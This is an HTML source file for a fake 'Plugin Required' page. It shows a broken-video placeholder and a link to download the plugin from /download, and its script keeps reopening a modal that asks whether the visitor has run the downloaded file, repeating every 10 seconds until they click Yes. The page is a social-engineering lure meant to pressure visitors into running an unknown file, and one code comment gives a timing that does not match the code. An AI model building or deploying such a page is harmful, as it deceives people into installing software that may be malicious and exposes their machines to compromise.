<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plugin Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .broken-video {
            width: 640px;
            height: 360px;
            background-color: #000;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            font-size: 24px;
        }
        .download-link {
            display: block;
            margin-top: 20px;
            font-size: 18px;
            color: blue;
            text-decoration: underline;
            cursor: pointer;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgb(0,0,0);
            background-color: rgba(0,0,0,0.4);
            padding-top: 60px;
        }
        .modal-content {
            background-color: #fefefe;
            margin: 5% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            text-align: center;
        }
        .modal button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Plugin Required</h1>
    <p>You need to install the required plugin to view this content.</p>
    <div class="broken-video">
        <p>Video cannot be displayed</p>
    </div>
    <a class="download-link" href="/download">Click here to re-download the plugin</a>

    <div id="myModal" class="modal">
        <div class="modal-content">
            <p>Have you run the downloaded file?</p>
            <button id="yesBtn">Yes</button>
            <button id="noBtn">No</button>
        </div>
    </div>

    <script>
        function showModal() {
            const modal = document.getElementById('myModal');
            modal.style.display = 'block';

            document.getElementById('yesBtn').onclick = function() {
                window.location.href = '/redirect_after_download';
            };

            document.getElementById('noBtn').onclick = function() {
                modal.style.display = 'none';
                setTimeout(showModal, 10000); // 10 seconds
            };
        }

        setTimeout(showModal, 10000); // First prompt after 30 seconds
    </script>
</body>
</html>
